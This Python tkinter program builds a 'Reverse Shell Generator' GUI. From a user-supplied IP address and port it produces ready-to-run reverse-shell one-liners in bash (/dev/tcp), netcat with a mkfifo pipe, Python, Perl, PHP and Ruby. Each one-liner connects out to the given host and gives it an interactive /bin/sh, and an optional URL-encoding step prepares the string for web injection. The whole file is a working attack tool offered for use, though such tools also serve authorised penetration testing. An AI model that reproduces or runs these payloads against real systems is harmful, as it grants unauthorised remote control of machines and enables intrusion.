import tkinter as tk
import urllib.parse
from tkinter import ttk

root = tk.Tk()
root.title("Reverse Shell Generator")
root.geometry("800x600")

# Add transparent icon
icon = tk.PhotoImage(file="Bash-new.sh_.png")
root.iconphoto(True, icon)

def generate_reverse_shell():
    selected_shell = shell_var.get()
    if selected_shell == 'bash':
        reverse_shell = "bash -i >& /dev/tcp/{}/{} 0>&1".format(ip_entry.get(), port_entry.get())
    elif selected_shell == 'nc':
        reverse_shell = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {} {} >/tmp/f".format(ip_entry.get(), port_entry.get())
    elif selected_shell == 'python':
        reverse_shell = "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{}\",{}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'".format(ip_entry.get(), port_entry.get())
    elif selected_shell == 'perl':
        reverse_shell = "perl -e 'use Socket;$i=\"{}\";$p={};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'".format(ip_entry.get(), port_entry.get())
    elif selected_shell == 'php':
        reverse_shell = "php -r '$sock=fsockopen(\"{}\",{});exec(\"/bin/sh -i <&3 >&3 2>&3\");'".format(ip_entry.get(), port_entry.get())
    elif selected_shell == 'ruby':
        reverse_shell = "ruby -rsocket -e'f=TCPSocket.open(\"{}\",{}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'".format(ip_entry.get(), port_entry.get())
        
    result_entry.delete(0, tk.END)
    result_entry.insert(0, reverse_shell)

def url_encode():
    reverse_shell = result_entry.get()
    encoded_shell = urllib.parse.quote(reverse_shell)
    result_entry.delete(0, tk.END)
    result_entry.insert(0, encoded_shell)

# create the input fields
ip_label = tk.Label(root, text="IP Address:")
ip_label.place(relx=0.1, rely=0.1)
ip_entry = tk.Entry(root)
ip_entry.place(relx=0.35, rely=0.1)

port_label = tk.Label(root, text="Port Number:")
port_label.place(relx=0.1, rely=0.2)
port_entry = tk.Entry(root)
port_entry.place(relx=0.35, rely=0.2)

# create the shell selection dropdown
shell_var = tk.StringVar()
shell_var.set('bash')

shell_options = ['bash', 'nc', 'python', 'perl', 'php', 'ruby']
shell_dropdown = ttk.Combobox(root, textvariable=shell_var, values=shell_options)
shell_dropdown.place(relx=0.1, rely=0.3)

# create the generate and URL encode buttons
generate_button = tk.Button(root, text="Generate Reverse Shell", command=generate_reverse_shell, padx=10)
generate_button.place(relx=0.22, rely=0.4)

url_button = tk.Button(root, text="URL Encode", command=url_encode, padx=10)
url_button.place(relx=0.55, rely=0.4)

# create the output field
result_label = tk.Label(root, text="Reverse Shell:")
result_label.place(relx=0.1, rely=0.5)
result_entry = tk.Entry(root)
result_entry.place(relx=0.35, rely=0.5, relwidth=0.6)


root.attributes('-fullscreen', False)
root.geometry("800x600")
root.protocol("WM_DELETE_WINDOW", root.quit)

root.mainloop()